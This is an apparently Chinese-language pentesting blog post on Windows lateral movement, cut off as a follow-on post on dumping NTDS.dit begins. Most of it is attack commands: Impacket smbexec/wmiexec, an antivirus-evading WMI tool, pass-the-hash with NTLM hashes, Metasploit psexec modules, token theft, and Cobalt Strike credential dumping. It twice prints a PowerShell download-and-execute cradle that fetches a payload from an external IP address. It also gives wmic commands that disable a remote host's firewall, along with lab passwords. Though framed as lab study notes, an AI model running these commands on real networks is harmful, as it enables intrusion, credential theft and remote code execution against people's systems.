title="Smbexec.py"></a>Smbexec.py</h3><p>impacket套件中smbexec是一款基于psexec的域渗透测试工具，并配套samba工具。<br>445端口</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\&gt;smbexec.py de1ay/administrator:1qaz@WSX3e@10.10.10.201</span><br><span class="line">Impacket v0.9.17 - Copyright 2019 SecureAuth Corporation</span><br><span class="line">[!] Launching semi-interactive shell - Careful what you execute</span><br></pre></td></tr></table></figure><h2 id="Wmiexec"><a href="#Wmiexec" class="headerlink" title="Wmiexec"></a>Wmiexec</h2><h3 id="Wmiexec-vbs"><a href="#Wmiexec-vbs" class="headerlink" title="Wmiexec.vbs"></a>Wmiexec.vbs</h3><p>基本原理：当用户输入命令时，WMI创建进程执行该命令，然后把结果输出到文件，这个文件位于之前创建的共享文件夹。最后，通过FSO组件访问远程共享文件夹（需要用到445端口）中的结果文件，将结果输出。当结果读取完成时，调用WMI执行命令删除结果文件。最后当WMIEXEC退出时，删除文件共享。</p><ol><li>单命令执行</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cscript.exe wmiexec.vbs /cmd ip username password &quot;command&quot;</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081342452.png" alt="image-20220808134239306" style="zoom:50%;" /><ol start="2"><li>半交互模式</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell cscript.exe //nologo c:\wmiexec.vbs /shell ip username password</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081343522.png" alt="image-20220808134319303" style="zoom:50%;" /><ol start="3"><li>注意</li></ol><p>wmi只是创建进程,没办法去判断一个进程是否执行完成(比如ping),这样就导致wmi.dll删除不成,下一次又是被占用,这时候修改一下vbs里面的名字就好：Const FileName &#x3D; “wmi1.dll”,也可以加入-persist参数(后台运行)</p><p>非域用户登陆到win08和2012中,只有administrator可以登陆成功,其他管理员账号会出现 WMIEXEC ERROR: Access is denied</p><h3 id="WMI-HACKER"><a href="#WMI-HACKER" class="headerlink" title="WMI-HACKER"></a>WMI-HACKER</h3><p>介绍：免杀横向渗透远程命令执行，常见的WMIEXEC、PSEXEC执行命令是创建服务或调用Win32_Process.create执行命令，这些方式都已经被杀软100%拦截，通过改造出WMIHACKER免杀横向移动测试工具。此工具通过135端口进行命令执行，读取执行结果以及进行文件传输时无需445端口，通过把执行结果写入注册表中，然后进行读取。</p><p>主要功能：1、命令执行；2、文件上传；3、文件下载<br>使用：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cscript //nologo WMIHACKER_0.6.vbs</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">有命令回显执行方式</span><br><span class="line">&gt; cscript WMIHACKER_0.6.vbs /cmd 172.16.94.187 administrator &quot;Password!&quot; &quot;systeminfo&quot; 1</span><br><span class="line">无命令回显</span><br><span class="line">&gt; cscript WMIHACKER_0.6.vbs /cmd 172.16.94.187 administrator &quot;Password!&quot; &quot;systeminfo &gt; c:\1.txt&quot; 0</span><br><span class="line">模拟shell模式</span><br><span class="line">&gt; cscript WMIHACKER_0.6.vbs /shell 172.16.94.187 administrator &quot;Password!&quot;</span><br><span class="line">文件上传-复制本机calc.exe到远程主机c:\calc.exe</span><br><span class="line">&gt; cscript wmihacker_0.4.vbe /upload 172.16.94.187 administrator &quot;Password!&quot; &quot;c:\windows\system32\calc.exe&quot; &quot;c:\calc&quot;</span><br><span class="line">文件下载-下载远程主机calc.exe到本地c:\calc.exe</span><br><span class="line">&gt; cscript wmihacker_0.4.vbe /download 172.16.94.187 administrator &quot;Password!&quot; &quot;c:\calc&quot; &quot;c:\windows\system32\calc.exe&quot;</span><br></pre></td></tr></table></figure><blockquote><p>360-Linton-Lab&#x2F;WMIHACKER(连接 上GitHub上康康)</p></blockquote><h3 id="wmicmd-exe"><a href="#wmicmd-exe" class="headerlink" title="wmicmd.exe"></a>wmicmd.exe</h3><p>wmicmd命令回显（工作组）</p><blockquote><p><a href="https://github.com/nccgroup/WMIcmd">https://github.com/nccgroup/WMIcmd</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">WMIcmd.exe -h 10.10.10.201 -u administrator -p 1qaz@WSX -d . -c &quot;ipconfig&quot;</span><br></pre></td></tr></table></figure><h3 id="Wmiexec-py"><a href="#Wmiexec-py" class="headerlink" title="Wmiexec.py"></a>Wmiexec.py</h3><p>Impacket套件<br>原理就是把数据先存到一个临时文件中，在每次读取完执行结果后就自动删除。可以用来回显执行命令<br>的结果和获取半交互式的shell</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python wmiexec.py -share admin$ administrator:1qaz@WSX@10.10.10.201</span><br></pre></td></tr></table></figure><h2 id="pth-winexe"><a href="#pth-winexe" class="headerlink" title="pth-winexe"></a>pth-winexe</h2><p>Kali自带pth工具集</p><ul><li>工作组</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pth-winexe -U administrator%1qaz@WSX3e --system --ostype=1 //10.10.10.201 command</span><br></pre></td></tr></table></figure><ul><li>域</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pth-winexe  -U de1ay/administrator%Aatest --system --ostype=1 //192.168.3.90 command</span><br></pre></td></tr></table></figure><h2 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h2><h3 id="Psexec"><a href="#Psexec" class="headerlink" title="Psexec"></a>Psexec</h3><p>和前面的psexec工具类似，该工具集成到msf之中，注意哈，msf5中的下面某些模块在msf6中是没有用了的~~工具嘛，失效了就换下一个~ 何必单恋一支花-</p><p>这种psexec就是利用账号密码，登录后再执行命令~~~</p><p><del><code>auxiliary/admin/smb/ms17_010_command</code>在msf6模块也是有用的</del>，出了点问题</p><ul><li>执行<strong>单个命令</strong>的PTH模块</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auxiliary/admin/smb/psexec_command</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use auxiliary/admin/smb/psexec_command</span><br><span class="line">msf5 auxiliary(admin/smb/psexec_command) &gt; options</span><br><span class="line">msf5 auxiliary(admin/smb/psexec_command) &gt; set command whoami</span><br><span class="line">msf5 auxiliary(admin/smb/psexec_command) &gt; set RHOSTS 10.10.10.201</span><br><span class="line">msf5 auxiliary(admin/smb/psexec_command) &gt; set SMBDomain de1ay</span><br><span class="line">msf5 auxiliary(admin/smb/psexec_command) &gt; set SMBUser administrator</span><br><span class="line">msf5 auxiliary(admin/smb/psexec_command) &gt; set SMBPass 1qaz@WSX3e</span><br><span class="line">msf5 auxiliary(admin/smb/psexec_command) &gt; run</span><br></pre></td></tr></table></figure><ul><li>执行直接就<strong>获取到meterpreter</strong>的PTH模块(有用)</li></ul><p>对域内知晓密码的机器进行攻击~~此刻的目标是DC</p><p>需要注意的是：</p><p>我们此时攻击的目标是内网机器，我们无法直接访问到，需要搭建代理，并且建立正向连接访问代理，再对内网的DC机器进行攻击！这一点是很重要的~~</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exploit/windows/smb/psexec</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit/windows/smb/psexec</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set RHOSTS 10.10.10.201</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set SMBDomain de1ay</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set smbuser administrator</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set smbpass 1qaz@WSX3e</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; run</span><br><span class="line"></span><br><span class="line">另外不要忘记添加代理，添加完代理后，msf会自动帮我们转发相应的请求</span><br><span class="line">#设置正向payload，建立正向连接</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt;set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">#添加路由</span><br><span class="line">run autoroute -s 10.10.10.0/24    添加到10.10.10.0网段的路由</span><br><span class="line">run autoroute -p    查看添加的路由</span><br><span class="line">#搭建socks代理</span><br><span class="line">search socks</span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">show options</span><br><span class="line">exploit –j </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exploit/windows/smb/psexec_psh</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit/windows/smb/psexec_psh</span><br><span class="line">msf5 exploit(windows/smb/psexec_psh) &gt; set RHOSTS 10.10.10.201</span><br><span class="line">msf5 exploit(windows/smb/psexec_psh) &gt; set SMBDomain de1ay</span><br><span class="line">msf5 exploit(windows/smb/psexec_psh) &gt; set smbuser administrator</span><br><span class="line">msf5 exploit(windows/smb/psexec_psh) &gt; set smbpass 1qaz@WSX3e</span><br><span class="line">msf5 exploit(windows/smb/psexec_psh) &gt; run</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auxiliary/admin/smb/ms17_010_command</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081421408.png" alt="image-20220808142121175" style="zoom:50%;" /><h3 id="Token窃取"><a href="#Token窃取" class="headerlink" title="Token窃取"></a>Token窃取</h3><ul><li>Token简介</li></ul><p>Windows有两种类型的Token：</p><ul><li><blockquote><p>Delegation token(授权令牌):用于交互会话登录(例如本地用户直接登录、远程桌面登录)</p></blockquote></li><li><blockquote><p>Impersonation token(模拟令牌):用于非交互登录(利用net use访问共享文件夹)</p></blockquote></li></ul><p>两种token只在系统重启后清除</p><blockquote><p>具有Delegation token的用户在注销后，该Token将变成Impersonation token，依旧有效</p></blockquote><p>这也就意味着 当主机上某台主机登录过，那么可能会遗留下相应的token，我们窃取之就可以以其身份登录~~~</p><p>可以通过此方法提权至域管用户，当然得要域管遗留下来这个token</p><ul><li>Metasploit</li></ul><blockquote><p>在Metasploit中，可使用incognito实现token窃取，Metasploit中的incognito，是从windows平台下的incognito移植过来的</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">加载incognito模块：</span><br><span class="line">load incognito</span><br><span class="line">列举token：</span><br><span class="line">list_tokens -u</span><br><span class="line">查看当前token：</span><br><span class="line">getuid</span><br><span class="line">提示至system权限：</span><br><span class="line">getsystem</span><br><span class="line">token窃取：</span><br><span class="line">impersonate_token &quot;NT AUTHORITY\\SYSTEM&quot;</span><br><span class="line">从进程窃取token：</span><br><span class="line">steal_token 4500</span><br><span class="line">返回之前token：</span><br><span class="line">rev2self、drop_token</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081427321.png" alt="image-20220808142725127" style="zoom:50%;" /><h2 id="Cobaltstrike"><a href="#Cobaltstrike" class="headerlink" title="Cobaltstrike"></a>Cobaltstrike</h2><p>首先通过powershell脚本上线：(记得关闭杀软)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://124.223.217.243:1232/a1&#x27;))&quot;</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208202251708.png" alt="image-20220820225108246" style="zoom:50%;" /><h3 id="凭证获取"><a href="#凭证获取" class="headerlink" title="凭证获取"></a>凭证获取</h3><p>beacon执行内置mimikatz的命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashdump</span><br><span class="line">logonpasswords</span><br></pre></td></tr></table></figure><h3 id="扫描存活主机"><a href="#扫描存活主机" class="headerlink" title="扫描存活主机"></a>扫描存活主机</h3><p>PortScan扫描存活主机，随便选几个端口，先探测存活再去扫描端口，可以探测存活主机 。beacon会不断返回探测结果</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208210024828.png" alt="image-20220821002431586" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208210024245.png" alt="image-20220821002459084" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208210028081.png" alt="image-20220821002824888" style="zoom:50%;" /></p><p>点击这个靶状的图标显示具体信息</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208210029381.png" alt="image-20220821002907220" style="zoom:50%;" /><h3 id="Psexec-1"><a href="#Psexec-1" class="headerlink" title="Psexec"></a>Psexec</h3><p>使用psexec就可以使用我们之前获取下来的账户密码 尝试登录这些机器了！！我们尝试移动到DC。在内网需要建立SMB监听（内网一台主机监听DC，我们的消息从smb传到WEB再传到我们VPS</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208210045294.png" alt="image-20220821004545125" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208210039528.png" alt="image-20220821003902374" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208210041658.png" alt="image-20220821004108900" style="zoom:50%;" /></p><p>其中session选项就是，通过我们在内网拿下的主机，凭借此建立的session进行跳转~~</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208210042915.png" alt="image-20220821004223743"></p><p>成功拿到DC,以WEB机器为跳板机，跳至DC</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208210043074.png" alt="image-20220821004340903" style="zoom:50%;" /><p>注意到SMB使用的payload是正向的管道连接~~</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208210049564.png" alt="image-20220821004910411" style="zoom:50%;" /><h3 id="Psexec-psh"><a href="#Psexec-psh" class="headerlink" title="Psexec_psh"></a>Psexec_psh</h3><blockquote><p>Psexec_psh hash传递</p></blockquote><h3 id="WinRM-1"><a href="#WinRM-1" class="headerlink" title="WinRM"></a>WinRM</h3><h3 id="Token窃取-1"><a href="#Token窃取-1" class="headerlink" title="Token窃取"></a>Token窃取</h3><p>steal token：只要用户登陆过就有对应token残留，我们就可以窃取~（只要没有关机）</p><p>另外：Delegation token的用户在注销后，该Token将变成Impersonation token，依旧有效（上面有讲）</p><p>可以对比下面的登录状态和注销状态的情况。并要注意到，msf自动集成了token窃取的工具，但是cs没有，需要我们手动上传。可使用incognito实现token窃取，Metasploit中的incognito，是从windows平台下的incognito移植过来的</p><blockquote><p>de1ay\administrator登录状态</p></blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081430453.png" alt="image-20220808143054224" style="zoom:50%;" /><blockquote><p>de1ay\administrator注销状态</p></blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208081431488.png" alt="image-20220808143124291" style="zoom:50%;" /><h2 id="SharpRDP"><a href="#SharpRDP" class="headerlink" title="SharpRDP"></a>SharpRDP</h2><blockquote><p>一个.NET控制台应用程序工具，可用于对横向目标执行针对远程目标<strong>的经过身份验证</strong>的命令执行。<br>用于经过身份验证的命令执行的远程桌面协议控制台应用程序</p></blockquote><h3 id="原理详解"><a href="#原理详解" class="headerlink" title="原理详解"></a>原理详解</h3><blockquote><p>再谈远程桌面横向移动<br>项目地址：<a href="https://github.com/0xthirteen/SharpRDP">0xthirteen&#x2F;SharpRDP</a></p></blockquote><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Regular RDP connection and execution</span><br><span class="line">常规RDP连接和执行</span><br><span class="line">SharpRDP.exe computername=target.domain command=&quot;C:\Temp\file.exe&quot; </span><br><span class="line">username=domain\user password=password</span><br><span class="line"></span><br><span class="line">Exec program as child process of cmd or powershell</span><br><span class="line">执行程序作为cmd或powershell的子进程</span><br><span class="line">SharpRDP.exe computername=target.domain command=&quot;C:\Temp\file.exe&quot; </span><br><span class="line">username=domain\user password=password exec=cmd</span><br><span class="line">Use restricted admin mode</span><br><span class="line">使用受限管理模式</span><br><span class="line">SharpRDP.exe computername=target.domain command=&quot;C:\Temp\file.exe&quot;</span><br><span class="line">Connect first host drives</span><br><span class="line">连接第一个主机驱动器</span><br><span class="line">SharpRDP.exe computername=domain.target command=&quot;\\tsclient\C\Temp\file.exe&quot; </span><br><span class="line">username=domain\user password=password connectdrive=true</span><br><span class="line">Execute command elevated through Run Dialog - CURRENTLY BUGGED</span><br><span class="line">执行通过运行对话框提升的命令-当前已安装</span><br><span class="line">SharpRDP.exe computername=domain.target command=&quot;C:\Temp\file.exe&quot; </span><br><span class="line">username=domain\user password=password elevated=winr</span><br><span class="line">Execute command elevated through task manager</span><br><span class="line">执行通过任务管理器提升的命令</span><br><span class="line">SharpRDP.exe computername=domain.target command=&quot;C:\Temp\file.exe\&quot; </span><br><span class="line">username=domain\user password=password elevated=taskmgr</span><br><span class="line">Add Network Level Authentication</span><br><span class="line">添加网络级身份验证</span><br><span class="line">SharpRDP.exe computername=domain.target command=&quot;C:\Temp\file.exe\&quot; </span><br><span class="line">username=domain\user password=password nla=true</span><br><span class="line">  </span><br><span class="line">Ask to take over logon session</span><br><span class="line">要求接管登录会话</span><br><span class="line">SharpRDP.exe computername=domain.target command=&quot;C:\Temp\file.exe\&quot; </span><br><span class="line">username=domain\user password=password takeover=true</span><br></pre></td></tr></table></figure><p>注：command为在目标机器上执行的命令<br>如果在目标上启用了受限管理模式，则不要指定任何凭据，它将使用当前用户上下文。<br>可以在 beacon 上 PTH 和 make_token ， windows 系统上 runas &#x2F;netonly</p><h3 id="使用效果"><a href="#使用效果" class="headerlink" title="使用效果"></a>使用效果</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SharpRDP.exe computername=172.26.2.43 command=&quot;powershell.exe -nop -w hidden -c </span><br><span class="line">\&quot;IEX ((new-object </span><br><span class="line">net.webclient).downloadstring(&#x27;http://139.155.49.43:880/a&#x27;))\&quot;&quot; </span><br><span class="line">username=MINGY\WIN7-1 password=iam8@Mingyue123</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208082050073.png" alt="image-20220808204827813"></p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208082050987.png" alt="image-20220808204839761"></p><h2 id="impacket套件"><a href="#impacket套件" class="headerlink" title="impacket套件"></a>impacket套件</h2><p>impacket套件是通过445端口进行通信的，不是135端口。</p><ul><li>Windows</li></ul><blockquote><p><a href="https://github.com/maaaaz/impacket-examples-windows">https://github.com/maaaaz/impacket-examples-windows</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">域用户</span><br><span class="line">wmiexec.exe -hashes :518B98AD4178A53695DC997AA02D455C 域</span><br><span class="line">名/administrator@192.168.3.123 &quot;ipconfig&quot;</span><br></pre></td></tr></table></figure><ul><li>Linux</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">工作组：</span><br><span class="line">python wmiexec.py -hashes </span><br><span class="line">aad3b435b51404eeaad3b435b51404ee:518b98ad4178a53695dc997aa02d455c </span><br><span class="line">administrator@10.10.10.201 &quot;ipconfig&quot;</span><br><span class="line">域用户：</span><br><span class="line">python wmiexec.py -hashes </span><br><span class="line">aad3b435b51404eeaad3b435b51404ee:518b98ad4178a53695dc997aa02d455c 域</span><br><span class="line">名/administrator@10.10.10.201 &quot;ipconfig&quot;</span><br></pre></td></tr></table></figure><h1 id="其他问题"><a href="#其他问题" class="headerlink" title="其他问题"></a>其他问题</h1><ul><li>内网防火墙问题~内网可能主机开启了防火墙~~~该怎么办呢？（某些情况下，防火墙会阻止内网主机出网，会影响我们横向移动的时候，对内网其他主机发起请求作正向连接</li></ul><p>使用netsh对防火墙状态进行更改：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查看防火墙配置的策略</span><br><span class="line">netsh advfirewall show allprofiles</span><br><span class="line"></span><br><span class="line">#所有网络</span><br><span class="line">打开所有网络防火墙</span><br><span class="line">netsh advfirewall set allprofiles state on</span><br><span class="line">关闭所有网络防火墙</span><br><span class="line">netsh advfirewall set allprofiles state off</span><br><span class="line"></span><br><span class="line">#为当前网络配置防火墙</span><br><span class="line">(与域/专用/公用网络无关)</span><br><span class="line">打开当前网络防火墙</span><br><span class="line">netsh advfirewall set currentprofile state on</span><br><span class="line">关闭当前网络防火墙</span><br><span class="line">netsh advfirewall set currentprofile state off</span><br><span class="line"></span><br><span class="line">#域网络</span><br><span class="line">打开域网络防火墙</span><br><span class="line">netsh advfirewall set domainprofile state on</span><br><span class="line">关闭域网络防火墙</span><br><span class="line">netsh advfirewall set domainprofile state off</span><br><span class="line"></span><br><span class="line">#专用网络</span><br><span class="line">打开专用网络防火墙</span><br><span class="line">netsh advfirewall set privateprofile state on</span><br><span class="line">关闭专用网络防火墙</span><br><span class="line">netsh advfirewall set privateprofile state off</span><br><span class="line"></span><br><span class="line">#公用网络</span><br><span class="line">打开公用网络防火墙</span><br><span class="line">netsh advfirewall set publicprofile state on</span><br><span class="line">关闭公用网络防火墙</span><br><span class="line">netsh advfirewall set publicprofile state off</span><br><span class="line"></span><br><span class="line">#较旧的Windows.版本</span><br><span class="line">XP Server 2003</span><br><span class="line">启用防火墙</span><br><span class="line">netsh firewall set opmode mode=ENABLE</span><br><span class="line">禁用防火墙</span><br><span class="line">netsh firewall set opmode mode=DISABLE</span><br></pre></td></tr></table></figure><ul><li>也是防火墙问题：msf正向连接报错，无法上线session会话时，我们如何关闭对面的防火墙呢</li></ul><p>前提时我们已经获取了该主机的账户密码，可以通过wmic连接上，并执行命令</p><p>关闭完对面的防火墙，就可以msf上线~~</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#wmic关闭防火墙</span><br><span class="line">wmic /node:10.10.11.10 /user:administrator /password:1qaz@WSX5 process dall create &quot;cmd /c netsh advfirewall set allprofiles state off&quot;</span><br><span class="line"></span><br><span class="line">wmic /node:10.10.11.10 /user:administrator /password:1qaz@WSX5 process call create &quot;cmd /c netsh advfirewall set domainprofile state off&quot;</span><br><span class="line"></span><br><span class="line">wmic /node:10.10.11.10 /user:administrator /password:1qaz@WSX5 process call create &quot;cmd /c netsh advfirewall set privateprofile state off&quot;</span><br><span class="line"></span><br><span class="line">wmic /node:10.10.11.10 /user:administrator /password:1qaz@WSX5 process call create &quot;cmd /c netsh advfirewall set publicprofile state off&quot;</span><br></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><blockquote><p>基于IPC的横向移动 <a href="https://cloud.tencent.com/developer/article/1691880">https://cloud.tencent.com/developer/article/1691880</a><br><a href="https://ares-x.com/2020/03/21/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%94%EF%BC%89%E5%9F%BA%E4%BA%8EIPC%E7%9A%84%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5/">域渗透学习（五）基于IPC的远程连接</a><br>Impacket套件之远程命令执行功能讲解 <a href="https://www.sohu.com/a/346196275_257305">https://www.sohu.com/a/346196275_257305</a><br>内网横向移动学习备忘录 - 清风明月&#96;s Blog <a href="https://www.secpulse.com/archives/140140.html">https://www.secpulse.com/archives/140140.html</a><br>SharpRDP - 远程桌面协议控制台应用程序，用于经过身份验证的命令执行 <a href="https://www.mianshigee.com/project/0xthirteen-SharpRDP">https://www.mianshigee.com/project/0xthirteen-SharpRDP</a><br>WMI横向移动<a href="https://blog.csdn.net/lhh134/article/details/104150949">https://blog.csdn.net/lhh134/article/details/104150949</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 内网 </category>
          
          <category> 横向移动 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 横向移动 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0x29 - 域内横向移动</title>
      <link href="/2022-08-21-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/0x29-%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"/>
      <url>/2022-08-21-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/0x29-%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</url>
      
        <content type="html"><![CDATA[<p>在上节所学的内网横向移动的某些内置命令、方法和工具，在域内也是可以用的。通过获取内网主机的凭证去登录其他主机，这种思路是通用的。并且要注意到工作组和域内渗透的不同之处（最大的不同方式应该在于域内的认证方式不同了~）</p><p>域内横向移动主要围绕域认证开始讲解。</p><h1 id="Windows认证机制（见密码凭据获取）"><a href="#Windows认证机制（见密码凭据获取）" class="headerlink" title="Windows认证机制（见密码凭据获取）"></a>Windows认证机制（见密码凭据获取）</h1><p>Windows的认证包括三个部分：</p><ul><li>本地认证：用户直接操作计算机登录账户</li><li>网络认证：远程连接到工作组中的某个设备</li><li>域认证：登陆到域环境中的某个设备</li></ul><h1 id="域内密码凭证获取"><a href="#域内密码凭证获取" class="headerlink" title="域内密码凭证获取"></a>域内密码凭证获取</h1><p>要获取域内所有的凭证，先获取域管权限是最好的</p><h2 id="Ntds-dit活动目录数据库的介绍"><a href="#Ntds-dit活动目录数据库的介绍" class="headerlink" title="Ntds.dit活动目录数据库的介绍"></a>Ntds.dit<strong>活动目录数据库</strong>的介绍</h2><blockquote><p>(也被称为Active Directory database——-AD DS)</p></blockquote><ol><li>域内：</li></ol><p>Ntds.dit 是主要的AD数据库，包括有关域用户，组和组成员身份的信息。它还包括域中<strong>所有用户</strong>的密码哈希值。为了进一步保护密码哈希值，使用存储在 <strong>SYSTEM 注册表配置单元中的密钥</strong>对这些哈希值进行加密。第二个加密步骤是为了执行<strong>密码转储</strong>以进行审计，所以总共需要两个文件的副本：ntds.dit和system文件。</p><blockquote><ul><li><strong>AD DS由 NTDS.DIT 文件构成，是Active Directory的核心</strong></li><li><strong>默认存储在域控的 %SystemRoot%\NTDS\  文件夹下</strong></li><li><strong>只能通过域控制器进程和协议访问</strong></li></ul></blockquote><ol start="2"><li>工作组中</li></ol><p>另外，在非域环境也就是在工作组环境中，有一个sam文件存储着当前主机用户的密码信息，想要破解sam文件与ntds.dit文件都需要拥有一个system文件（上一节有讲到）。最可靠的执行密码审计的方法是脱机的。</p><ol start="3"><li>获取NTDS.DIT和SAM的内容</li></ol><p>因此我们可以通过获取到这两个文件，然后破解得到其中所存储的密码哈希值。Windows系统为了进一步保护存储的密码哈希值，使用存储在<strong>SYSTEM注册表配置单元中的密钥</strong>对这些哈希值进行加密。因此想要破解SAM文件与NTDS.DIT文件都需要获取一个SYSTEM文件。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NTDS.DIT文件位置：%SystemRoot%\NTDS\NTDS.dit</span><br><span class="line">SYSTEM文件位置：%SystemRoot%\System32\config\SYSTEM</span><br><span class="line">SAM文件位置：%SystemRoot%\System32\config\SAM</span><br></pre></td></tr></table></figure><p>由于Window会阻止对这些文件的标准读取或复制操作，如果直接去复制NTDS.DIT文件，会提示文件被系统占用（实际上是被KDC占用），所以常规的复制下载方法是无法获取到文件副本的，因此需要通过特殊方法来获取其副本。获取副本后再用system文件密钥对之解密~~</p><p>接下来就是讲解工具对之利用~</p><h2 id="从Windows中获取NTDS-DIT等敏感文件"><a href="#从Windows中获取NTDS-DIT等敏感文件" class="headerlink" title="从Windows中获取NTDS.DIT等敏感文件"></a>从Windows中获取NTDS.DIT等敏感文件</h2><blockquote><p>下面讲述的方法围绕VSS（Volume Shadow Copy）展开，各种工具都是利用VSS，从中获取敏感文件的副本！！</p></blockquote><h3 id="Volume-Shadow-Copy"><a href="#Volume-Shadow-Copy" class="headerlink" title="Volume Shadow Copy"></a>Volume Shadow Copy</h3><p>Volume Shadow Copy Service  卷影复制服务（VSS）是微软从 Windows XP  开始提供的用于创建一致性的时间点副本（也就是快照）的服务框架。用于更好的备份和还原关键业务数据。当所有组件都支持VSS时，可以使用它们来备份应用程序数据，而无需使应用程序脱机。</p><p><strong>我们可以利用 Volume Shadow Copy Service 来获取 NTDS.DIT、SAM、SYSTEM 等文件副本</strong>。后面讲的一些方法也基本上都是围绕这VSS展开利用</p><blockquote><ul><li>系统内置~~支持 Windows Server 2003  及以上操作系统</li><li>系统默认在特定条件下自动创建数据备份，如补丁安装后。在Win7系统大概每隔一周自动创建备份，该时间无法确定</li><li>禁用VSS会影响系统正常使用，如 System Restore和 Windows Server Backup</li></ul></blockquote><h4 id="注意备份后留下的痕迹："><a href="#注意备份后留下的痕迹：" class="headerlink" title="注意备份后留下的痕迹："></a>注意备份后留下的痕迹：</h4><ol><li>调用 Volume Shadow Copy 服务会产生SYSTEM日志， Event ID 为7036。</li><li>执行 ntdsutil snapshot “activate instance ntds” create quit quit 会额外产生 Event ID 为 98 的日志</li></ol><h4 id="优点："><a href="#优点：" class="headerlink" title="优点："></a>优点：</h4><blockquote><ul><li>获得信息全面：可获得所有用户hash</li><li>简单高效</li><li>无需下载ntds.dit，隐蔽性高</li><li>无需免杀</li></ul></blockquote><h3 id="Ntdsutil"><a href="#Ntdsutil" class="headerlink" 